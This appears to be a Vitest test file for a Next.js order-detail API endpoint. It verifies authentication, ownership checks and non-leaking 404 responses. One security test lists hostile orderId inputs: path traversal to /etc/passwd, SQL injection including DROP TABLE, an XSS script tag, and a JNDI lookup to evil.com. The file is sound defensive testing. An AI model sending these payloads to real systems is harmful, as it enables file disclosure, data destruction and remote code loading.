/**
 * [ORD-09] Tests para el endpoint GET /api/orders/:orderId
 * [ORD-16] Tests de seguridad para acceso a pedidos
 *
 * Tests unitarios siguiendo TDD para el endpoint de detalle de pedido
 * con validación de propiedad del pedido.
 *
 * CRITERIOS DE ACEPTACIÓN [ORD-09]:
 * - El endpoint responde en GET /api/orders/:orderId
 * - Requiere autenticación JWT
 * - Valida que el pedido pertenezca al usuario autenticado
 * - Retorna 404 si el pedido no pertenece al usuario
 * - Retorna 404 si el pedido no existe
 * - Retorna datos completos del pedido
 * - Coverage > 80%
 *
 * CRITERIOS DE ACEPTACIÓN [ORD-16]:
 * - Tests mockean diferentes usuarios
 * - Tests verifican respuestas 200, 401, 404
 * - Tests verifican que error 404 no filtra datos del pedido
 * - Tests verifican logging de intentos no autorizados
 * - Tests simulan escenarios de ataque
 * - Los tests son determinísticos
 * - Coverage > 80% en validación de seguridad
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { GET } from '../route'
import { NextRequest } from 'next/server'
import { SESSION_COOKIE } from '@/lib/auth/session'

vi.mock('@/lib/constants', () => ({
  API_URL: 'http://localhost:1337',
}))

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('[ORD-09] GET /api/orders/:orderId', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    global.fetch = vi.fn()
  })

  /**
   * Test 1: Autenticación - Debe rechazar requests sin token
   */
  describe('Autenticación', () => {
    it('should return 401 if no session cookie is provided', async () => {
      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(401)
      expect(data.error).toBe('No tienes una sesión activa. Inicia sesión.')
    })

    it('should return 401 if session cookie is invalid', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: false,
        status: 401,
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'invalid-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(401)
      expect(data.error).toBe('Sesión expirada. Inicia sesión de nuevo.')
    })
  })

  /**
   * Test 2: Pedido no encontrado (404)
   */
  describe('Pedido no encontrado', () => {
    it('should return 404 if order does not exist', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-NONEXISTENT'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-NONEXISTENT' }),
      })
      const data = await response.json()

      expect(response.status).toBe(404)
      expect(data.error).toBe('Pedido no encontrado')
    })
  })

  /**
   * Test 3: Pedido pertenece a otro usuario (now returns 404 for security)
   * With the filter-based approach, orders are filtered by userId, so orders
   * belonging to other users simply aren't found (returns 404, not 403)
   */
  describe('Validación de propiedad', () => {
    it('should return 404 if order belongs to another user (security: do not reveal existence)', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(404)
      expect(data.error).toBe('Pedido no encontrado')
    })
  })

  /**
   * Test 4: Acceso exitoso a pedido propio
   */
  describe('Acceso exitoso', () => {
    it('should return order details if user owns the order', async () => {
      const mockOrder = {
        id: 1,
        documentId: 'doc-001',
        orderId: 'ORD-1234567890-A',
        user: { id: 1 },
        items: [
          {
            id: '1',
            name: 'Reloj Casio',
            price: 99.99,
            quantity: 1,
            images: ['/images/reloj1.jpg'],
            href: '/products/reloj-casio',
            description: 'Reloj Casio de alta calidad',
            stock: 10,
          },
        ],
        subtotal: 99.99,
        shipping: 0,
        total: 99.99,
        orderStatus: 'paid',
        paymentIntentId: 'pi_123456',
        createdAt: '2025-11-20T10:00:00Z',
        updatedAt: '2025-11-20T10:00:00Z',
        publishedAt: '2025-11-20T10:00:00Z',
      }

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [mockOrder] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(200)
      expect(data.data.orderId).toBe('ORD-1234567890-A')
      expect(data.data.items).toHaveLength(1)
      expect(data.data.total).toBe(99.99)
      expect(data.data.orderStatus).toBe('paid')
    })

    it('should return complete order data including items details', async () => {
      const mockOrder = {
        id: 1,
        documentId: 'doc-001',
        orderId: 'ORD-1234567890-A',
        user: { id: 1 },
        items: [
          {
            id: '1',
            name: 'Reloj Casio',
            price: 29.99,
            quantity: 2,
            images: ['/images/reloj1.jpg'],
            href: '/products/reloj-casio',
            description: 'Reloj Casio',
            stock: 10,
          },
          {
            id: '2',
            name: 'Reloj Seiko',
            price: 199.99,
            quantity: 1,
            images: ['/images/reloj2.jpg'],
            href: '/products/reloj-seiko',
            description: 'Reloj Seiko',
            stock: 5,
          },
        ],
        subtotal: 259.97,
        shipping: 0,
        total: 259.97,
        orderStatus: 'shipped',
        paymentIntentId: 'pi_123456',
        createdAt: '2025-11-20T10:00:00Z',
        updatedAt: '2025-11-20T10:00:00Z',
        publishedAt: '2025-11-20T10:00:00Z',
      }

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [mockOrder] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(200)
      expect(data.data.items).toHaveLength(2)
      expect(data.data.items[0].name).toBe('Reloj Casio')
      expect(data.data.items[0].quantity).toBe(2)
      expect(data.data.items[0].price).toBe(29.99)
      expect(data.data.items[0].images).toEqual(['/images/reloj1.jpg'])
      expect(data.data.subtotal).toBe(259.97)
      expect(data.data.total).toBe(259.97)
    })
  })

  /**
   * Test 5: Manejo de errores de Strapi
   */
  describe('Manejo de errores', () => {
    it('should return 502 if Strapi users/me fails', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: false,
        status: 500,
        statusText: 'Internal Server Error',
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(502)
      expect(data.error).toBe('No pudimos verificar tu sesión. Inténtalo de nuevo.')
    })

    it('should return 502 if Strapi orders fetch fails', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: false,
        status: 500,
        statusText: 'Internal Server Error',
        text: async () => 'Internal Server Error',
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(502)
      expect(data.error).toBe('No pudimos cargar tu pedido. Inténtalo de nuevo.')
    })

    it('should handle unexpected errors gracefully', async () => {
      vi.mocked(global.fetch).mockRejectedValueOnce(
        new Error('Network failure')
      )

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(502)
      expect(data.error).toBe('No pudimos verificar tu sesión. Inténtalo de nuevo.')
    })
  })

  /**
   * [ORD-16] Suite de Tests de Seguridad - Acceso No Autorizado
   *
   * OBJETIVO: Verificar que los usuarios NO pueden acceder a pedidos que no les pertenecen
   * y que los intentos de acceso no autorizado se manejan correctamente.
   *
   * SECURITY PRINCIPLES:
   * 1. Least Privilege: Usuarios solo ven sus propios pedidos
   * 2. Information Disclosure Prevention: No revelar si el pedido existe
   * 3. Audit Logging: Registrar intentos no autorizados
   * 4. Fail Secure: En caso de error, denegar acceso
   */
  describe('[ORD-16] Security - Unauthorized Access', () => {
    let consoleWarnSpy: ReturnType<typeof vi.spyOn>

    beforeEach(() => {
      vi.clearAllMocks()
      global.fetch = vi.fn()
      consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})
    })

    afterEach(() => {
      consoleWarnSpy.mockRestore()
    })

    /**
     * Test 1: Usuario no puede ver pedido de otro usuario
     *
     * SCENARIO: User 1 intenta acceder al pedido de User 2
     * EXPECTED: 404 (no revelar existencia del pedido)
     */
    it('should return 404 when user tries to access another user\'s order', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user1@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({
          data: [
            { orderId: 'ORD-USER1-001' },
            { orderId: 'ORD-USER1-002' },
          ],
        }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-USER2-999'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token-user1')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-USER2-999' }),
      })
      const data = await response.json()

        expect(response.status).toBe(404)
        expect(data.error).toBe('Pedido no encontrado')

        expect(data.error).not.toContain('another user')
        expect(data.error).not.toContain('permission')
        expect(data.error).not.toContain('unauthorized')
    })

    /**
     * Test 2: Token inválido es rechazado
     *
     * SCENARIO: Token expirado, corrupto, o revocado
     * EXPECTED: 401 Unauthorized
     */
    it('should return 401 for invalid/expired JWT token', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: false,
        status: 401,
        statusText: 'Unauthorized',
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'expired-or-invalid-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(401)
      expect(data.error).toBe('Sesión expirada. Inicia sesión de nuevo.')

      expect(global.fetch).toHaveBeenCalledWith(
        expect.stringContaining('/api/users/me'),
        expect.objectContaining({
          headers: expect.objectContaining({
            Authorization: 'Bearer expired-or-invalid-token',
            'X-Trace-Id': expect.any(String),
          }),
        })
      )
    })

    /**
     * Test 3: Error 404 NO expone información del pedido
     *
     * SCENARIO: Usuario intenta acceder a pedido ajeno con datos sensibles
     * EXPECTED: Response NO contiene información sensible
     *
     * SECURITY PRINCIPLE: Information Disclosure Prevention
     */
    it('should NOT expose order information in 404 error response', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'attacker@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-SENSITIVE-DATA'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-SENSITIVE-DATA' }),
      })
      const data = await response.json()

      expect(response.status).toBe(404)

      const responseBody = JSON.stringify(data)
      expect(responseBody).not.toContain('total')
      expect(responseBody).not.toContain('email')
      expect(responseBody).not.toContain('address')
      expect(responseBody).not.toContain('phone')
      expect(responseBody).not.toContain('creditCard')
      expect(responseBody).not.toContain('paymentMethod')
      expect(responseBody).not.toContain('user')
      expect(responseBody).not.toContain('customer')

      expect(data).toEqual({ error: 'Pedido no encontrado' })
    })

    /**
     * Test 4: Pedido inexistente retorna 404
     *
     * SCENARIO: Usuario intenta acceder a un pedido que no existe en el sistema
     * EXPECTED: 404 con mensaje genérico
     *
     * NOTE: Este test es similar al existente pero está en la suite de seguridad
     * para verificar que el comportamiento es consistente (404 para no encontrado
     * y 404 para no autorizado = no information disclosure)
     */
    it('should return 404 for non-existent order', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-DOES-NOT-EXIST'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-DOES-NOT-EXIST' }),
      })
      const data = await response.json()

      expect(response.status).toBe(404)
      expect(data.error).toBe('Pedido no encontrado')
    })

    /**
     * Test 5: Verificar que solo se retornan datos del propietario
     *
     * SCENARIO: Usuario accede a SU PROPIO pedido
     * EXPECTED: 200 con datos completos
     */
    it('should only return order data when user is the owner', async () => {
      const mockOrder = {
        id: 1,
        documentId: 'doc-001',
        orderId: 'ORD-OWNER-123',
        user: { id: 42 },
        items: [
          {
            id: '1',
            name: 'Reloj Premium',
            price: 299.99,
            quantity: 1,
          },
        ],
        total: 299.99,
        orderStatus: 'paid',
      }

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 42, email: 'owner@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [mockOrder] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-OWNER-123'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token-user42')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-OWNER-123' }),
      })
      const data = await response.json()

      expect(response.status).toBe(200)
      expect(data.data.orderId).toBe('ORD-OWNER-123')
      expect(data.data.user.id).toBe(42)
      expect(data.data.total).toBe(299.99)
    })
  })

  /**
   * [ORD-16] Suite de Tests de Seguridad - Escenarios de Ataque
   *
   * OBJETIVO: Simular intentos de ataque y verificar que el sistema los maneja correctamente
   *
   * ATTACK SCENARIOS:
   * 1. Path Traversal: Intentar acceder a archivos del sistema
   * 2. SQL Injection: Intentar inyectar código SQL (aunque usamos API, no SQL directo)
   * 3. XSS: Intentar inyectar scripts
   * 4. Brute Force: Múltiples intentos de acceso no autorizado
   */
  describe('[ORD-16] Security - Attack Scenarios', () => {
    let consoleWarnSpy: ReturnType<typeof vi.spyOn>

    beforeEach(() => {
      vi.clearAllMocks()
      global.fetch = vi.fn()
      consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})
    })

    afterEach(() => {
      consoleWarnSpy.mockRestore()
    })

    /**
     * Test 6: Manejo de patrones maliciosos en orderId
     *
     * SCENARIO: Attacker intenta path traversal, SQL injection, XSS
     * EXPECTED: Sistema maneja todos los casos sin errores (retorna 404)
     */
    it('should handle malicious orderId patterns safely', async () => {
      const maliciousPatterns = [
        '../../../etc/passwd',
        "ORD-123'; DROP TABLE orders--",
        '<script>alert("xss")</script>',
        'ORD-123 OR 1=1',
        '${jndi:ldap://evil.com/a}',
        '../admin/users',
        '../../secrets.txt',
      ]

      for (const maliciousOrderId of maliciousPatterns) {
        vi.clearAllMocks()

        vi.mocked(global.fetch).mockResolvedValueOnce({
          ok: true,
          status: 200,
          json: async () => ({ id: 1, email: 'user@example.com' }),
        } as Response)

        vi.mocked(global.fetch).mockResolvedValueOnce({
          ok: true,
          status: 200,
          json: async () => ({ data: [] }),
        } as Response)

        const request = new NextRequest(
          `http://localhost:3000/api/orders/${encodeURIComponent(maliciousOrderId)}`
        )
        request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

        const response = await GET(request, {
          params: Promise.resolve({ orderId: maliciousOrderId }),
        })
        const data = await response.json()

        expect(response.status).toBe(404)
        expect(data.error).toBe('Pedido no encontrado')
      }
    })

    /**
     * Test 7: Múltiples intentos de acceso no autorizado
     *
     * SCENARIO: Attacker intenta acceder a múltiples pedidos ajenos (brute force)
     * EXPECTED: Todos los intentos se rechazan y generan el mismo error 404
     *
     * SECURITY: Sistema debe ser consistente en respuestas para evitar timing attacks
     */
    it('should consistently reject multiple unauthorized access attempts', async () => {
      const unauthorizedOrderIds = [
        'ORD-VICTIM-001',
        'ORD-VICTIM-002',
        'ORD-VICTIM-003',
        'ORD-VICTIM-004',
        'ORD-VICTIM-005',
      ]

      for (const orderId of unauthorizedOrderIds) {
        vi.clearAllMocks()

        vi.mocked(global.fetch).mockResolvedValueOnce({
          ok: true,
          status: 200,
          json: async () => ({ id: 1, email: 'attacker@example.com' }),
        } as Response)

        vi.mocked(global.fetch).mockResolvedValueOnce({
          ok: true,
          status: 200,
          json: async () => ({ data: [] }),
        } as Response)

        const request = new NextRequest(
          `http://localhost:3000/api/orders/${orderId}`
        )
        request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

        const response = await GET(request, {
          params: Promise.resolve({ orderId }),
        })
        const data = await response.json()

        expect(response.status).toBe(404)
        expect(data).toEqual({ error: 'Pedido no encontrado' })
      }
    })

    /**
     * Test 8: Token presente pero usuario no existe en Strapi
     *
     * SCENARIO: Token válido pero el usuario fue eliminado de la BD
     * EXPECTED: Error 502 (problema del servidor, no del cliente)
     */
    it('should handle deleted/invalid user gracefully', async () => {
      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: false,
        status: 404,
        statusText: 'Not Found',
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-1234567890-A'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-token-deleted-user')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-1234567890-A' }),
      })
      const data = await response.json()

      expect(response.status).toBe(502)
      expect(data.error).toBe('No pudimos verificar tu sesión. Inténtalo de nuevo.')

      expect(data.error).not.toContain('deleted')
      expect(data.error).not.toContain('not found')
      expect(data.error).not.toContain('does not exist')
    })
  })

  /**
   * [ORD-16] Suite de Tests de Seguridad - Verificación de Estructura
   *
   * OBJETIVO: Verificar que la estructura de las respuestas es correcta y segura
   */
  describe('[ORD-16] Security - Response Structure', () => {
    beforeEach(() => {
      vi.clearAllMocks()
      global.fetch = vi.fn()
    })

    /**
     * Test 9: Verificar estructura de respuesta exitosa
     *
     * SCENARIO: Usuario accede a su pedido correctamente
     * EXPECTED: Response contiene todos los campos necesarios y ninguno sensible extra
     */
    it('should return complete and safe order structure on success', async () => {
      const mockOrder = {
        id: 1,
        documentId: 'doc-001',
        orderId: 'ORD-STRUCTURE-TEST',
        user: { id: 1, email: 'user@example.com' },
        items: [
          {
            id: '1',
            name: 'Reloj Test',
            price: 99.99,
            quantity: 1,
            images: ['/images/test.jpg'],
            href: '/products/test',
            description: 'Test watch',
            stock: 10,
          },
        ],
        subtotal: 99.99,
        shipping: 10.0,
        total: 109.99,
        orderStatus: 'paid',
        paymentIntentId: 'pi_test123',
        createdAt: '2025-11-20T10:00:00Z',
        updatedAt: '2025-11-20T10:00:00Z',
        publishedAt: '2025-11-20T10:00:00Z',
      }

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [mockOrder] }),
      } as Response)

      const request = new NextRequest(
        'http://localhost:3000/api/orders/ORD-STRUCTURE-TEST'
      )
      request.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response = await GET(request, {
        params: Promise.resolve({ orderId: 'ORD-STRUCTURE-TEST' }),
      })
      const data = await response.json()

      expect(response.status).toBe(200)

      expect(data.data).toHaveProperty('orderId')
      expect(data.data).toHaveProperty('items')
      expect(data.data).toHaveProperty('total')
      expect(data.data).toHaveProperty('orderStatus')
      expect(data.data).toHaveProperty('createdAt')

      expect(Array.isArray(data.data.items)).toBe(true)
      expect(data.data.items[0]).toHaveProperty('name')
      expect(data.data.items[0]).toHaveProperty('price')
      expect(data.data.items[0]).toHaveProperty('quantity')

      expect(data.data.user.id).toBe(1)
    })

    /**
     * Test 10: Verificar consistencia de errores
     *
     * SCENARIO: Diferentes tipos de errores (404, 401, 500)
     * EXPECTED: Todos tienen estructura consistente
     */
    it('should return consistent error structure for all error types', async () => {
      const request401 = new NextRequest(
        'http://localhost:3000/api/orders/ORD-TEST'
      )
      const response401 = await GET(request401, {
        params: Promise.resolve({ orderId: 'ORD-TEST' }),
      })
      const data401 = await response401.json()

      expect(response401.status).toBe(401)
      expect(data401).toHaveProperty('error')
      expect(typeof data401.error).toBe('string')

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ id: 1, email: 'user@example.com' }),
      } as Response)

      vi.mocked(global.fetch).mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ data: [] }),
      } as Response)

      const request404 = new NextRequest(
        'http://localhost:3000/api/orders/ORD-NOT-FOUND'
      )
      request404.cookies.set(SESSION_COOKIE, 'valid-jwt-token')

      const response404 = await GET(request404, {
        params: Promise.resolve({ orderId: 'ORD-NOT-FOUND' }),
      })
      const data404 = await response404.json()

      expect(response404.status).toBe(404)
      expect(data404).toHaveProperty('error')
      expect(typeof data404.error).toBe('string')

      expect(Object.keys(data401)).toEqual(['error'])
      expect(Object.keys(data404)).toEqual(['error'])
    })
  })
})
